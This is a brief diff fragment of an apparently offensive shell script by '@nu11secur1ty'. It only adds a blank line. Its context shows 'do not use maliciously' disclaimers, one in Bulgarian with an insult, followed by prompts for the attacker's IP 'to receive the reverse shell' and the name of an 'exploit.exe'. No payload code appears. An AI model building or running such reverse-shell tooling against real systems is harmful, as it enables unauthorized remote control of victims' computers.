@@ -2,6 +2,7 @@
 # Author @nu11secur1ty
 # Do not use this for malicious purpose
 # Ne izpolzvai za zlonamereni celi TUPALKO
+
 echo "Type your IP to receive the reverse shell"
 	read SRV
 echo "Type the name of your exploit.exe"
